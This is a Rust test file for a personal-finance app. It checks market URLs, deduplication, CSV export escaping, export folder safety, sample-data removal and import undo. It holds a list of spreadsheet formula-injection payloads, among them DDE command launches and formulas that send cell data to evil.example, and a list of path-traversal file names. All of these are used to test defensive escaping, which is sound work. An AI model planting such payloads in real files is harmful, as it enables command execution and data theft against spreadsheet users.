        let segs: Vec<&str> = url.path_segments().unwrap().collect();
        assert_eq!(segs.len(), 4, "{s:?} became {segs:?}");
        assert_eq!(&segs[..3], ["v8", "finance", "chart"], "{s:?}");

        let search = reqwest::Url::parse(&market::search_url(s)).unwrap();
        assert_eq!(search.host_str(), Some("query2.finance.yahoo.com"), "{s:?}");
        let keys: Vec<String> = search.query_pairs().map(|(k, _)| k.into_owned()).collect();
        assert_eq!(keys, ["q", "quotesCount", "newsCount"], "{s:?}");

        let page = reqwest::Url::parse(&market::quote_page(s)).unwrap();
        assert_eq!(page.host_str(), Some("finance.yahoo.com"), "{s:?}");
        assert!(page.query().is_none() && page.fragment().is_none(), "{s:?}");
    }
}

#[test]
fn a_symbol_of_dots_stays_inside_the_chart_path() {
    for s in ["..", "."] {
        let url = reqwest::Url::parse(&market::chart_url(s, day("2026-01-01"), day("2026-02-01")))
            .unwrap();
        assert!(
            url.path().starts_with("/v8/finance/chart/") && url.path().len() > 18,
            "{s:?} resolved to {}",
            url.path()
        );
    }
}

/* ------------------------------------------------------ normalisation -- */

#[test]
#[ignore = "FINDING: normalise_description does not unify NFC and NFD, so one purchase exported by two tools hashes to two rows (\"café\" vs \"cafe\")"]
fn the_same_text_composed_or_decomposed_is_the_same_transaction() {
    // macOS tools and some spreadsheet exports write accents decomposed. To a
    // person the two are one word; to the dedupe hash they must be too, or
    // the same statement re-imported from another tool counts twice.
    let composed = "CAF\u{c9} CENTRAL";
    let decomposed = "CAFE\u{301} CENTRAL";
    assert_ne!(composed, decomposed);
    assert_eq!(
        normalise_description(composed),
        normalise_description(decomposed)
    );

    let b = Book::new();
    let acct = account(&b, "Main");
    import(
        b.db(),
        acct,
        "a.csv",
        vec![row("2026-03-01", composed, -250)],
    );
    let again = import(
        b.db(),
        acct,
        "b.csv",
        vec![row("2026-03-01", decomposed, -250)],
    );
    assert_eq!(again.duplicates, 1, "the same purchase was inserted twice");
}

#[test]
fn an_exact_rule_with_nothing_to_match_matches_nothing() {
    let b = Book::new();
    let acct = account(&b, "Main");
    let housing = category(b.db(), "Housing");
    import(
        b.db(),
        acct,
        "r.csv",
        vec![
            row("2026-03-01", "1234567", -100),
            row("2026-03-02", "***", -200),
            row("2026-03-03", "ACME", -300),
        ],
    );
    rule_save(b.st(), rule("%", "exact", housing)).unwrap();
    let applied = apply_rules(b.db(), None).unwrap();
    assert_eq!(applied, 0, "a pattern of `%` filed {applied} transactions");
}

/* ------------------------------------------------------------- export -- */

/// Text a stranger can put on a bank statement, in the shapes spreadsheets
/// run. DDE payloads are the classic: Excel offers to launch a program.
const FORMULA_PAYLOADS: [&str; 16] = [
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1:A9)",
    "\t=1+1",
    "\r=1+1",
    "=cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
    "@cmd|' /C calc'!A0",
    "=HYPERLINK(\"http://evil.example/?\"&A1,\"click\")",
    "=IMPORTXML(\"http://evil.example\",\"//a\")",
    "=-1+cmd|' /C calc'!A0",
    "-2+3",
    "==1",
    "=\"=1\"",
];

/// One of everything the export writes, with a payload in every text column.
fn hostile_export_book() -> Book {
    let b = Book::new();
    for (i, p) in FORMULA_PAYLOADS.iter().enumerate() {
        let n = i as i64 + 1;
        let key = format!("c{n}");
        let cat = 100 + n;
        let date = format!("2026-02-{n:02}");
        let db = b.db();
        exec(
            db,
            "INSERT INTO account (id, name, kind, institution) VALUES (?1, ?2, 'checking', ?2)",
            params![n, p],
        );
        exec(
            db,
            "INSERT INTO pl_category (id, name, kind) VALUES (?1, ?2, 'expense')",
            params![cat, p],
        );
        exec(
            db,
            "INSERT INTO project_event (id, name, default_category_id) VALUES (?1, ?2, ?3)",
            params![n, p, cat],
        );
        exec(
            db,
            "INSERT INTO txn (id, account_id, booked_on, amount_minor, currency, description_raw,
                              description_norm, counterparty, category_override_id, project_id,
                              notes, dedupe_hash)
             VALUES (?1, ?1, '2026-01-05', ?2, 'EUR', ?3, ?4, ?3, ?5, ?1, ?3, ?6)",
            params![
                n,
                -(n * 100 + 27),
                p,
                normalise_description(p),
                cat,
                format!("h{n}")
            ],
        );
        exec(
            db,
            "INSERT INTO holding (id, name, symbol, asset_class) VALUES (?1, ?2, ?2, 'equities')",
            params![n, p],
        );
        exec(
            db,
            "INSERT INTO holding_txn (holding_id, on_date, kind, amount_minor, units_e8)
             VALUES (?1, '2026-01-06', 'buy', 100000, 150000000)",
            params![n],
        );
        exec(
            db,
            "INSERT INTO holding_price (holding_id, on_date, price_micro) VALUES (?1, '2026-01-06', 1234567)",
            params![n],
        );
        exec(
            db,
            "INSERT INTO asset_class (key, name, kind) VALUES (?1, ?2, 'liquid')",
            params![key, p],
        );
        exec(
            db,
            "INSERT INTO wealth_snapshot (id, taken_on) VALUES (?1, ?2)",
            params![n, date],
        );
        exec(
            db,
            "INSERT INTO wealth_line (snapshot_id, bucket, label, gross_value_minor, debt_minor,
                                      currency, source)
             VALUES (?1, ?2, ?3, -12345, 500, ?3, 'manual')",
            params![n, key, p],
        );
        let food = category(db, "Food & groceries");
        exec(
            db,
            "INSERT INTO budget (category_id, period, amount_minor) VALUES (?1, ?2, 5000)",
            params![food, format!("20{:02}", 10 + n)],
        );
    }
    let items: Vec<PlanItem> = FORMULA_PAYLOADS
        .iter()
        .map(|p| PlanItem {
            kind: "expense".into(),
            name: (*p).into(),
            amount_minor: 4_250,
        })
        .collect();
    b.db().with(|c| plan::save(c, "2026-03", &items)).unwrap();

    // Currencies with other than two decimals, and the largest amount there is.
    exec(
        b.db(),
        "INSERT INTO account (id, name, kind, currency) VALUES (50, 'Tokyo', 'cash', 'JPY'),
                                                               (51, 'Kuwait', 'cash', 'KWD')",
        [],
    );
    for (acct, minor, cur, hash) in [
        (50, -1_500, "JPY", "j"),
        (51, -1_500, "KWD", "k"),
        (1, i64::MIN, "EUR", "min"),
        (1, i64::MAX, "EUR", "max"),
    ] {
        exec(
            b.db(),
            "INSERT INTO txn (account_id, booked_on, amount_minor, currency, description_raw,
                              description_norm, dedupe_hash)
             VALUES (?1, '2026-01-09', ?2, ?3, 'FIXTURE', 'fixture', ?4)",
            params![acct, minor, cur, hash],
        );
    }
    b
}

type Exported = BTreeMap<String, Vec<Vec<String>>>;

const STYLES: [Style; 3] = [
    Style {
        delimiter: b',',
        decimal: '.',
    },
    Style {
        delimiter: b';',
        decimal: ',',
    },
    Style {
        delimiter: b'\t',
        decimal: '.',
    },
];

/// Run the real writer into a temp folder and parse what it produced, rows
/// of cells, the way a spreadsheet would.
fn export_and_parse(b: &Book, style: Style) -> (tempfile::TempDir, Exported) {
    let out = tempfile::tempdir().unwrap();
    let files = b.db().with(|c| export_all(c, out.path(), style)).unwrap();
    let mut all = Exported::new();
    for f in files {
        let bytes = std::fs::read(out.path().join(&f.name)).unwrap();
        assert_eq!(&bytes[..3], &[0xEF, 0xBB, 0xBF], "{}: BOM", f.name);
        let mut rdr = csv::ReaderBuilder::new()
            .has_headers(false)
            .delimiter(style.delimiter)
            .from_reader(&bytes[3..]);
        let rows: Vec<Vec<String>> = rdr
            .records()
            .map(|r| {
                r.unwrap_or_else(|e| panic!("{} is not well-formed CSV: {e}", f.name))
                    .iter()
                    .map(str::to_string)
                    .collect()
            })
            .collect();
        assert_eq!(rows.len(), f.rows + 1, "{}: header plus rows", f.name);
        all.insert(f.name, rows);
    }
    (out, all)
}

/// Columns that hold a number, by file and header. Everything else is text.
fn is_numeric_column(file: &str, header: &str) -> bool {
    matches!(
        (file, header),
        ("transactions.csv", "id" | "amount")
            | ("net_worth.csv", "value" | "owed")
            | ("holding_movements.csv", "amount" | "units")
            | ("holding_prices.csv", "price")
            | ("budgets.csv", "amount")
            | ("monthly_plans.csv", "position" | "amount")
    )
}

/// What a spreadsheet starts evaluating on.
fn runs_as_formula(cell: &str) -> bool {
    matches!(
        cell.chars().next(),
        Some('=' | '+' | '-' | '@' | '\t' | '\r')
    )
}

fn is_plain_number(cell: &str, decimal: char) -> bool {
    let body = cell.strip_prefix('-').unwrap_or(cell);
    let (whole, frac) = body.split_once(decimal).unwrap_or((body, "0"));
    !whole.is_empty()
        && whole.chars().all(|c| c.is_ascii_digit())
        && !frac.is_empty()
        && frac.chars().all(|c| c.is_ascii_digit())
}

#[test]
fn no_text_cell_in_any_export_can_run_as_a_formula() {
    let b = hostile_export_book();
    for style in STYLES {
        let (_out, files) = export_and_parse(&b, style);
        let mut loose = Vec::new();
        for (file, rows) in &files {
            let header = &rows[0];
            for (r, cells) in rows.iter().enumerate().skip(1) {
                for (c, cell) in cells.iter().enumerate() {
                    if is_numeric_column(file, &header[c]) {
                        continue;
                    }
                    if runs_as_formula(cell) {
                        loose.push(format!("{file} row {r} {}: {cell:?}", header[c]));
                    }
                }
            }
        }
        assert!(
            loose.is_empty(),
            "{} cell(s) would run as a formula, e.g. {:#?}",
            loose.len(),
            &loose[..loose.len().min(5)]
        );

        // Escaping must not eat the text: every payload is still readable.
        let every_cell: Vec<&str> = files
            .values()
            .flatten()
            .flatten()
            .map(String::as_str)
            .collect();
        for p in FORMULA_PAYLOADS {
            assert!(
                every_cell.iter().any(|c| c.contains(p.trim())),
                "{p:?} is no longer in the export"
            );
        }
    }
}

#[test]
fn a_real_negative_amount_stays_a_number_and_never_gets_a_quote_prefix() {
    // The other half of the formula rule: a fix that quotes everything that
    // starts with `-` would turn every expense into text and break every sum.
    let b = hostile_export_book();
    for style in STYLES {
        let (_out, files) = export_and_parse(&b, style);
        let dec = style.decimal;

        let tx = &files["transactions.csv"];
        let col = |name: &str| tx[0].iter().position(|h| h == name).unwrap();
        let (id_col, amount_col, cur_col) = (col("id"), col("amount"), col("currency"));
        let amount_of = |id: &str| {
            tx.iter()
                .find(|r| r[id_col] == id)
                .unwrap_or_else(|| panic!("no transaction {id}"))[amount_col]
                .clone()
        };
        assert_eq!(amount_of("1"), format!("-1{dec}27"));
        assert_eq!(amount_of("16"), format!("-16{dec}27"));

        // No decimals for yen, three for dinars, and the extremes intact.
        let by_currency = |cur: &str| -> Vec<&str> {
            tx.iter()
                .filter(|r| r[cur_col] == cur && r[col("description")] == "FIXTURE")
                .map(|r| r[amount_col].as_str())
                .collect()
        };
        assert_eq!(by_currency("JPY"), ["-1500"]);
        assert_eq!(by_currency("KWD"), [format!("-1{dec}500")]);
        assert_eq!(
            by_currency("EUR"),
            [
                format!("-92233720368547758{dec}08"),
                format!("92233720368547758{dec}07")
            ]
        );

        let mut checked = 0;
        for (file, rows) in &files {
            for (c, header) in rows[0].iter().enumerate() {
                if !is_numeric_column(file, header) {
                    continue;
                }
                for cells in rows.iter().skip(1) {
                    let cell = &cells[c];
                    if cell.is_empty() && header == "units" {
                        continue; // a buy known by its amount only
                    }
                    let integer = !cell.contains(dec);
                    assert!(
                        is_plain_number(cell, dec) || (integer && is_plain_number(cell, '.')),
                        "{file} {header}: {cell:?} is not a plain number"
                    );
                    checked += 1;
                }
            }
        }
        assert!(checked > 100, "only {checked} numbers were checked");

        // A negative net-worth value, written from a payload-named line.
        let nw = &files["net_worth.csv"];
        let value = nw[0].iter().position(|h| h == "value").unwrap();
        assert!(
            nw.iter()
                .skip(1)
                .all(|r| r[value] == format!("-123{dec}45"))
        );
    }
}

#[test]
fn ordinary_text_is_written_exactly_as_it_is() {
    // Escaping has to be for the dangerous cells only: a description that
    // merely contains a dash, a plus or a leading quote is left alone.
    let b = Book::new();
    let acct = account(&b, "Main");
    let texts = [
        "MERCADONA",
        "Caf\u{e9}, Bar \"El T\u{fa}nel\"",
        "Rent - March",
        "A+B",
        "50% off",
        "x@y.example",
        "#hash",
        "'quoted",
        "1-2",
        "\u{1f600}",
    ];
    let rows = texts
        .iter()
        .enumerate()
        .map(|(i, t)| row("2026-03-01", t, -(i as i64) - 1))
        .collect();
    import(b.db(), acct, "o.csv", rows);
    for style in STYLES {
        let (_out, files) = export_and_parse(&b, style);
        let tx = &files["transactions.csv"];
        let col = tx[0].iter().position(|h| h == "description").unwrap();
        let got: BTreeSet<&str> = tx.iter().skip(1).map(|r| r[col].as_str()).collect();
        for t in texts {
            assert!(got.contains(t), "{t:?} was changed: {got:?}");
        }
    }
}

/// Every path under `root`, relative, without following links.
fn tree(root: &Path) -> BTreeSet<String> {
    fn walk(dir: &Path, root: &Path, out: &mut BTreeSet<String>) {
        for entry in std::fs::read_dir(dir).unwrap() {
            let entry = entry.unwrap();
            let rel = entry.path().strip_prefix(root).unwrap().to_owned();
            // Always "/" between parts, so the same expectations hold on Windows.
            out.insert(
                rel.to_string_lossy()
                    .replace(std::path::MAIN_SEPARATOR, "/"),
            );
            if entry.file_type().unwrap().is_dir() {
                walk(&entry.path(), root, out);
            }
        }
    }
    let mut out = BTreeSet::new();
    walk(root, root, &mut out);
    out
}

const EXPORT_FILES: [&str; 8] = [
    "budgets.csv",
    "categories.csv",
    "holding_movements.csv",
    "holding_prices.csv",
    "holdings.csv",
    "monthly_plans.csv",
    "net_worth.csv",
    "transactions.csv",
];

fn export_to(b: &Book, parent: &Path) -> AppResult<ExportOutcome> {
    data_export(
        b.st(),
        parent.to_string_lossy().into_owned(),
        ",".into(),
        ".".into(),
    )
}

#[test]
fn names_in_the_book_cannot_steer_where_an_export_is_written() {
    let b = Book::new();
    let names = [
        "../evil",
        "..\\evil",
        "../../../../../../tmp/coin-heaven-escaped",
        "C:\\Windows\\System32\\evil",
        "\\\\server\\share\\evil",
        "/etc/passwd",
        "~/evil",
        "CON",
        "NUL",
        "COM1",
        "aux.txt",
        "trailing.",
        "trailing ",
        "name\0.csv",
        "\u{202e}vsc.exe",
        &"n".repeat(400),
    ];
    for (i, n) in names.iter().enumerate() {
        let i = i as i64 + 1;
        exec(
            b.db(),
            "INSERT INTO account (id, name, kind) VALUES (?1, ?2, 'checking')",
            params![i, n],
        );
        exec(
            b.db(),
            "INSERT INTO pl_category (id, name, kind) VALUES (?1, ?2, 'expense')",
            params![100 + i, n],
        );
        exec(
            b.db(),
            "INSERT INTO txn (account_id, booked_on, amount_minor, description_raw,
                              description_norm, category_override_id, dedupe_hash)
             VALUES (?1, '2026-03-01', -100, ?2, 'x', ?3, ?4)",
            params![i, n, 100 + i, format!("h{i}")],
        );
    }

    let root = tempfile::tempdir().unwrap();
    let chosen = root.path().join("chosen");
    std::fs::create_dir(&chosen).unwrap();
    std::fs::write(root.path().join("sentinel.txt"), "mine").unwrap();
    let before = tree(root.path());

    let out = export_to(&b, &chosen).unwrap();

    // Exactly the documented files, with names that are plain and short.
    let mut named: Vec<&str> = out.files.iter().map(|f| f.name.as_str()).collect();
    named.sort_unstable();
    assert_eq!(named, EXPORT_FILES);
    for n in &named {
        assert!(
            n.is_ascii() && n.len() < 40 && !n.contains(['/', '\\', ':', '\0']),
            "{n}"
        );
    }

    // The only change under the sandbox is one new folder inside `chosen`.
    let folder = Path::new(&out.folder);
    assert_eq!(folder.parent(), Some(chosen.as_path()));
    let added: BTreeSet<String> = tree(root.path()).difference(&before).cloned().collect();
    let leaf = folder.file_name().unwrap().to_string_lossy().into_owned();
    let mut expected: BTreeSet<String> = EXPORT_FILES
        .iter()
        .map(|f| format!("chosen/{leaf}/{f}"))
        .collect();
    expected.insert(format!("chosen/{leaf}"));
    assert_eq!(added, expected);
    assert_eq!(
        std::fs::read_to_string(root.path().join("sentinel.txt")).unwrap(),
        "mine"
    );
    assert!(!Path::new("/tmp/coin-heaven-escaped").exists());

    // The hostile names are in the data, as data.
    let csv = std::fs::read_to_string(folder.join("transactions.csv")).unwrap();
    assert!(csv.contains("../evil") && csv.contains("C:\\Windows\\System32\\evil"));
    assert_eq!(
        out.files
            .iter()
            .find(|f| f.name == "transactions.csv")
            .unwrap()
            .rows,
        names.len()
    );
}

#[test]
fn exporting_again_never_reuses_or_replaces_what_is_already_there() {
    let b = Book::new();
    let acct = account(&b, "Main");
    import(b.db(), acct, "m.csv", vec![row("2026-03-01", "ACME", -100)]);

    let root = tempfile::tempdir().unwrap();
    let today = chrono::Local::now().date_naive();
    let base = format!("Coin Heaven export {today}");
    // A file and a folder a person made, under the names an export would pick.
    std::fs::write(root.path().join(&base), "my own file").unwrap();
    let theirs = root.path().join(format!("{base} (2)"));
    std::fs::create_dir(&theirs).unwrap();
    std::fs::write(theirs.join("transactions.csv"), "my own ledger").unwrap();

    let first = export_to(&b, root.path()).unwrap();
    let first_bytes = std::fs::read(Path::new(&first.folder).join("transactions.csv")).unwrap();
    // The book changes, so a second export differs from the first.
    import(
        b.db(),
        acct,
        "n.csv",
        vec![row("2026-03-02", "NEW ROW", -200)],
    );
    let second = export_to(&b, root.path()).unwrap();

    let dirs = [&first.folder, &second.folder];
    assert_ne!(dirs[0], dirs[1], "two exports shared a folder");
    for d in dirs {
        assert_ne!(Path::new(d), theirs, "wrote into a person's folder");
        assert_ne!(Path::new(d), root.path().join(&base));
    }
    assert_eq!(
        std::fs::read_to_string(root.path().join(&base)).unwrap(),
        "my own file"
    );
    assert_eq!(
        std::fs::read_to_string(theirs.join("transactions.csv")).unwrap(),
        "my own ledger"
    );
    assert_eq!(std::fs::read_dir(&theirs).unwrap().count(), 1);
    assert_eq!(
        std::fs::read(Path::new(&first.folder).join("transactions.csv")).unwrap(),
        first_bytes,
        "the second export changed the first"
    );
    let second_csv =
        std::fs::read_to_string(Path::new(&second.folder).join("transactions.csv")).unwrap();
    assert!(second_csv.contains("NEW ROW"));
}

#[cfg(unix)]
#[test]
fn a_link_where_the_folder_would_go_is_not_written_through() {
    use std::os::unix::fs::symlink;
    let b = Book::new();
    let acct = account(&b, "Main");
    import(b.db(), acct, "m.csv", vec![row("2026-03-01", "ACME", -100)]);

    let root = tempfile::tempdir().unwrap();
    let chosen = root.path().join("chosen");
    std::fs::create_dir(&chosen).unwrap();
    let outside = root.path().join("outside");
    std::fs::create_dir(&outside).unwrap();
    let today = chrono::Local::now().date_naive();
    let base = chosen.join(format!("Coin Heaven export {today}"));

    // A link to a real folder elsewhere.
    symlink(&outside, &base).unwrap();
    let out = export_to(&b, &chosen).unwrap();
    assert_ne!(
        Path::new(&out.folder),
        base,
        "followed a link out of the folder"
    );
    assert_eq!(std::fs::read_dir(&outside).unwrap().count(), 0);

    // A link to somewhere that does not exist yet.
    std::fs::remove_file(&base).unwrap();
    let nowhere = root.path().join("not-yet");
    symlink(&nowhere, &base).unwrap();
    let r = export_to(&b, &chosen);
    assert!(!nowhere.exists(), "created the far end of a link ({r:?})");
}

#[test]
fn a_folder_that_is_not_one_is_refused_and_nothing_is_created() {
    let b = Book::new();
    let root = tempfile::tempdir().unwrap();
    let file = root.path().join("plain.txt");
    std::fs::write(&file, "x").unwrap();
    let before = tree(root.path());

    for bad in [
        String::new(),
        "   ".into(),
        "\0".into(),
        "folder\0name".into(),
        file.to_string_lossy().into_owned(),
        root.path().join("missing").to_string_lossy().into_owned(),
        format!("{}/plain.txt/inside", root.path().display()),
    ] {
        let r = data_export(b.st(), bad.clone(), ",".into(), ".".into());
        assert!(matches!(r, Err(AppError::Invalid(_))), "{bad:?}: {r:?}");
    }
    assert_eq!(tree(root.path()), before);
}

/* ------------------------------------------------------- sample data -- */

const TODAY: &str = "2026-10-13";

fn load_sample(b: &Book) -> i64 {
    b.db()
        .with(|c| sample::load(c, day(TODAY), "en", "EUR"))
        .unwrap();
    one(b.db(), "SELECT id FROM account", [])
}

#[test]
fn removing_the_sample_takes_only_the_sample_even_beside_look_alike_rows() {
    let b = Book::new();
    let sample_account = load_sample(&b);
    let sample_txns = ids(b.db(), "SELECT id FROM txn");
    assert!(sample_txns.len() > 150);
    let sample_holdings = ids(b.db(), "SELECT id FROM holding");
    let sample_snapshots = ids(b.db(), "SELECT id FROM wealth_snapshot");

    // What a person adds while looking around: the same descriptions, the
    // same amounts on the same days, a holding with the same name, a balance
    // with the same labels, a plan, a budget, a rule and an event.
    let mine = account(&b, "Mine");
    b.db()
        .with(|c| {
            c.execute(
                "INSERT INTO txn (account_id, booked_on, description_raw, description_norm,
                                  amount_minor, currency, category_override_id, categorized_by,
                                  dedupe_hash)
                 SELECT ?1, booked_on, description_raw, description_norm, amount_minor, currency,
                        category_override_id, 'user', 'mine-' || id
                 FROM txn WHERE account_id = ?2",
                params![mine, sample_account],
            )?;
            c.execute(
                "INSERT INTO holding (name, symbol, asset_class) VALUES ('Bitcoin', 'BTC', 'crypto')",
                [],
            )?;
            c.execute(
                "INSERT INTO wealth_snapshot (taken_on, label) VALUES ('2024-12-31', 'mine')",
                [],
            )?;
            c.execute(
                "INSERT INTO wealth_line (snapshot_id, bucket, label, gross_value_minor)
                 VALUES (last_insert_rowid(), 'cash', 'Current account', 123456)",
                [],
            )?;
            c.execute(
                "INSERT INTO categorization_rule (name, match_kind, pattern, set_category_id)
                 VALUES ('mine', 'contains', 'streamflix',
                         (SELECT id FROM pl_category WHERE name = 'Subscriptions'))",
                [],
            )?;
            c.execute(
                "INSERT INTO project_event (name, default_category_id)
                 VALUES ('Trip', (SELECT id FROM pl_category WHERE name = 'Leisure & travel'))",
                [],
            )?;
            c.execute(
                "INSERT INTO budget (category_id, period, amount_minor)
                 VALUES ((SELECT id FROM pl_category WHERE name = 'Housing'), '2024', 100000)",
                [],
            )?;
            Ok(())
        })
        .unwrap();
    b.db()
        .with(|c| {
            plan::save(
                c,
                "2024-01",
                &[PlanItem {
                    kind: "income".into(),
                    name: "Salary".into(),
                    amount_minor: 200_000,
                }],
            )
        })
        .unwrap();
    let mine_txns = ids(
        b.db(),
        &format!("SELECT id FROM txn WHERE account_id = {mine}"),
    );
    assert_eq!(mine_txns.len(), sample_txns.len());
    let my_holding: i64 = one(
        b.db(),
        "SELECT id FROM holding WHERE id NOT IN (SELECT id FROM holding WHERE 0) ORDER BY id DESC",
        [],
    );
    assert!(!sample_holdings.contains(&my_holding));

    b.db().with(sample::remove).unwrap();

    assert_eq!(ids(b.db(), "SELECT id FROM txn"), mine_txns);
    assert_eq!(
        ids(b.db(), "SELECT id FROM account"),
        BTreeSet::from([mine])
    );
    assert_eq!(
        ids(b.db(), "SELECT id FROM holding"),
        BTreeSet::from([my_holding])
    );
    let snaps = ids(b.db(), "SELECT id FROM wealth_snapshot");
    assert_eq!(snaps.len(), 1);
    assert!(snaps.is_disjoint(&sample_snapshots));
    assert_eq!(
        one::<i64>(b.db(), "SELECT count(*) FROM wealth_line", []),
        1
    );
    assert_eq!(
        one::<i64>(b.db(), "SELECT count(*) FROM categorization_rule", []),
        1
    );
    assert_eq!(
        one::<i64>(b.db(), "SELECT count(*) FROM project_event", []),
        1
    );
    assert_eq!(
        column(b.db(), "SELECT period FROM budget"),
        ["2024"],
        "only the budget the person made is left"
    );
    assert_eq!(column(b.db(), "SELECT period FROM plan_month"), ["2024-01"]);
    assert!(!b.db().with(sample::status).unwrap().loaded);
    b.assert_intact();
}

#[test]
fn a_transaction_the_person_put_in_the_sample_account_survives_its_removal() {
    let b = Book::new();
    let sample_account = load_sample(&b);
    // The sample account is the only account on screen, so it is where a first
    // statement or a first hand-typed expense naturally goes.
    import(
        b.db(),
        sample_account,
        "mine.csv",
        vec![
            row("2026-10-01", "MY OWN COFFEE", -300),
            row("2026-10-02", "STREAMFLIX", -1299),
        ],
    );
    assert_eq!(
        one::<i64>(
            b.db(),
            "SELECT count(*) FROM txn WHERE import_batch_id IS NOT NULL",
            []
        ),
        2
    );

    b.db().with(sample::remove).unwrap();

    assert_eq!(
        column(
            b.db(),
            "SELECT description_raw FROM txn ORDER BY booked_on, id"
        ),
        ["MY OWN COFFEE", "STREAMFLIX"],
        "removing the sample deleted what the person had added"
    );
    b.assert_intact();
}

#[test]
fn a_balance_recorded_beside_the_sample_loses_no_lines_it_should_keep_and_keeps_no_ghosts() {
    let b = Book::new();
    load_sample(&b);
    // Recording a balance while the sample is loaded writes lines for the
    // sample holdings into it, exactly as `snapshot_save` does.
    b.db()
        .with(|c| {
            c.execute(
                "INSERT INTO wealth_snapshot (taken_on, label) VALUES ('2026-09-15', 'mine')",
                [],
            )?;
            c.execute(
                "INSERT INTO wealth_line (snapshot_id, bucket, label, gross_value_minor)
                 VALUES (last_insert_rowid(), 'cash', 'My savings', 500000)",
                [],
            )?;
            sync_snapshot(c, day("2026-09-15"))?;
            Ok(())
        })
        .unwrap();
    assert!(
        one::<i64>(
            b.db(),
            "SELECT count(*) FROM wealth_line l JOIN wealth_snapshot s ON s.id = l.snapshot_id
              WHERE s.taken_on = '2026-09-15' AND l.source = 'holding'",
            [],
        ) >= 2,
        "the fixture should have put the sample holdings in the snapshot"
    );

    b.db().with(sample::remove).unwrap();

    assert_eq!(orphans(b.db()), Vec::<String>::new());
    assert_eq!(
        column(
            b.db(),
            "SELECT l.label FROM wealth_line l JOIN wealth_snapshot s ON s.id = l.snapshot_id
              WHERE s.taken_on = '2026-09-15'"
        ),
        ["My savings"],
        "the person's own line is what remains"
    );
}

#[test]
fn an_account_with_a_linked_refund_can_be_deleted_with_everything_in_it() {
    let b = Book::new();
    exec(
        b.db(),
        "INSERT INTO account (id, name, kind) VALUES (1, 'A', 'cash'), (2, 'B', 'cash')",
        [],
    );
    for (id, acct, parent, link) in [
        (1, 1, None, None),
        (2, 1, Some(1), Some("reimbursement")),
        (3, 2, None, None),
    ] {
        exec(
            b.db(),
            "INSERT INTO txn (id, account_id, booked_on, amount_minor, description_raw,
                              description_norm, dedupe_hash, parent_txn_id, link_kind)
             VALUES (?1, ?2, '2026-01-01', -100, 'x', 'x', ?3, ?4, ?5)",
            params![id, acct, format!("h{id}"), parent, link],
        );
    }
    b.db()
        .with(|c| {
            c.execute("DELETE FROM account WHERE id = 1", [])?;
            Ok(())
        })
        .expect("deleting the account failed");
    assert_eq!(ids(b.db(), "SELECT id FROM txn"), BTreeSet::from([3]));
    assert_eq!(orphans(b.db()), Vec::<String>::new());
}

#[test]
fn the_sample_can_still_be_removed_after_the_person_linked_a_refund_inside_it() {
    let b = Book::new();
    let acct = load_sample(&b);
    let bill = id_of(b.db(), "ELECTRA ENERGY", acct);
    let refund = id_of(b.db(), "STREAMFLIX", acct);
    txn_link_reimbursement(b.st(), Some(bill), refund).unwrap();

    b.db()
        .with(sample::remove)
        .expect("the sample could not be removed");
    assert_eq!(one::<i64>(b.db(), "SELECT count(*) FROM txn", []), 0);
}

/* ------------------------------------------------------- import undo -- */

struct Imports {
    b: Book,
    main: i64,
    joint: i64,
    a: ImportSummary,
    b_batch: ImportSummary,
    c: ImportSummary,
}

/// Three statements and some hand-entered rows, all with look-alike text.
fn three_imports() -> Imports {
    let b = Book::new();
    let main = account(&b, "Main");
    let joint = account(&b, "Joint");
    let db = b.db();
    let a = import(
        db,
        main,
        "january.csv",
        vec![
            row("2026-01-03", "STREAMFLIX", -1299),
            row("2026-01-05", "ELECTRA ENERGY", -8000),
            row("2026-01-07", "ACME PAYROLL", 285_000),
            row("2026-01-09", "CORNER BAKERY", -450),
        ],
    );
    let b_batch = import(
        db,
        main,
        "february.csv",
        vec![
            row("2026-02-03", "STREAMFLIX", -1299),
            row("2026-02-05", "ELECTRA ENERGY REFUND", 2000),
            row("2026-02-07", "ACME PAYROLL", 285_000),
        ],
    );
    let c = import(
        db,
        joint,
        "joint.csv",
        vec![
            row("2026-01-03", "STREAMFLIX", -1299),
            row("2026-01-07", "ACME PAYROLL", 285_000),
        ],
    );
    exec(
        db,
        "INSERT INTO txn (account_id, booked_on, description_raw, description_norm,
                          amount_minor, dedupe_hash)
         VALUES (?1, '2026-01-03', 'STREAMFLIX', 'streamflix', -1299, 'typed-1'),
                (?1, '2026-01-07', 'ACME PAYROLL', 'acme payroll', 285000, 'typed-2')",
        params![main],
    );
    assert_eq!(
        (a.inserted, b_batch.inserted, c.inserted),
        (4, 3, 2),
        "the fixture must not collapse"
    );
    Imports {
        b,
        main,
        joint,
        a,
        b_batch,
        c,
    }
}

#[test]
fn undoing_one_import_with_everything_removes_that_batch_and_only_that_batch() {
    let w = three_imports();
    let db = w.b.db();
    let housing = category(db, "Housing");

    // The person has worked on the January rows, and on one outside them.
    let a_bill = id_of(db, "ELECTRA ENERGY", w.main);
    let a_stream = id_of(db, "STREAMFLIX", w.main); // two rows; the imported one
    let a_stream = a_stream.min(
        ids(
            db,
            &format!(
                "SELECT id FROM txn WHERE import_batch_id = {}",
                w.a.batch_id
            ),
        )
        .into_iter()
        .next()
        .unwrap(),
    );
    let refund = id_of(db, "ELECTRA ENERGY REFUND", w.main);
    txn_update(
        w.b.st(),
        a_stream,
        TxnEdit {
            category_id: Some(housing),
            notes: Some("kept".into()),
            ..no_edit()
        },
    )
    .unwrap();
    txn_link_reimbursement(w.b.st(), Some(a_bill), refund).unwrap();

    let others_before = ids(
        db,
        &format!(
            "SELECT id FROM txn WHERE import_batch_id IS NOT {a}",
            a = w.a.batch_id
        ),
    );
    let a_rows = ids_in_batch(db, w.a.batch_id);
    assert_eq!(a_rows.len(), 4);
    let impact = db.with(|c| runner::impact(c, w.a.batch_id)).unwrap();
    assert_eq!(impact.total, 4);
    assert_eq!(impact.linked_from_elsewhere, 1);

    let removed = runner::undo(db, w.a.batch_id, true).unwrap();

    assert_eq!(removed, 4);
    assert!(ids_in_batch(db, w.a.batch_id).is_empty());
    assert_eq!(
        ids(db, "SELECT id FROM txn"),
        others_before,
        "something outside the batch changed"
    );
    // The refund from February stands alone again.
    let (parent, link): (Option<i64>, Option<String>) = db
        .with(|c| {
            Ok(c.query_row(
                "SELECT parent_txn_id, link_kind FROM txn WHERE id = ?1",
                [refund],
                |r| Ok((r.get(0)?, r.get(1)?)),
            )?)
        })
        .unwrap();
    assert_eq!((parent, link), (None, None));
    // The other two statements and the typed rows are as they were.
